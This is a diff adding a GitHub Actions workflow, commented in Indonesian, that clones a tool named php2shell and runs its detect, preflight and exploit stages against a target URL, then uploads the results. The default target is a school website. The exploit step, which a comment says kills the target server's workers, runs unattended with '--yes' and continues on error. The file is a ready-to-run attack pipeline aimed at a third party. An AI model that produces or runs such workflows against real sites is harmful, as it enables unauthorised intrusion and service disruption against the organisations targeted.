@@ -1,0 +1,71 @@
+name: php2shell Full Toolkit
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'URL target (milik sendiri)'
+        required: true
+        default: 'https://smkssyaum.sch.id/user/index.php'
+
+jobs:
+  toolkit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install dependencies sistem
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3-venv libcurl4-openssl-dev libssl-dev build-essential
+
+      - name: Clone php2shell & Setup
+        run: |
+          git clone https://github.com/aarsaputra/php2shell.git
+          cd php2shell
+          python3 -m venv .venv
+          source .venv/bin/activate
+          pip install --upgrade pip
+          pip install -r requirements.txt
+
+      - name: 1. Cek Versi Tool (version)
+        run: |
+          cd php2shell
+          source .venv/bin/activate
+          python php2shell.py version | tee version-output.txt
+
+      - name: 2. Cek Dukungan Build (builds)
+        run: |
+          cd php2shell
+          source .venv/bin/activate
+          python php2shell.py builds | tee builds-output.txt
+
+      - name: 3. Deteksi Target (detect)
+        run: |
+          cd php2shell
+          source .venv/bin/activate
+          python php2shell.py detect -u "${{ github.event.inputs.target }}" | tee detect-output.txt
+
+      - name: 4. Skor Kesiapan (preflight)
+        run: |
+          cd php2shell
+          source .venv/bin/activate
+          python php2shell.py preflight -u "${{ github.event.inputs.target }}" | tee preflight-output.txt
+
+      # PERINGATAN: Langkah di bawah ini akan memicu exploit (mematikan worker server target)
+      # Jika hanya ingin cek aman, hapus atau beri komentar pada langkah ini.
+      - name: 5. Eksploitasi (exploit)
+        run: |
+          cd php2shell
+          source .venv/bin/activate
+          python php2shell.py exploit -u "${{ github.event.inputs.target }}" --yes | tee exploit-output.txt
+        continue-on-error: true # Agar workflow tidak langsung berhenti jika exploit gagal (HEAP_LEAK_FAILED)
+
+      - name: Upload Hasil (Artifacts)
+        uses: actions/upload-artifact@v4
+        with:
+          name: php2shell-full-results
+          path: |
+            php2shell/version-output.txt
+            php2shell/builds-output.txt
+            php2shell/detect-output.txt
+            php2shell/preflight-output.txt
+            php2shell/exploit-output.txt
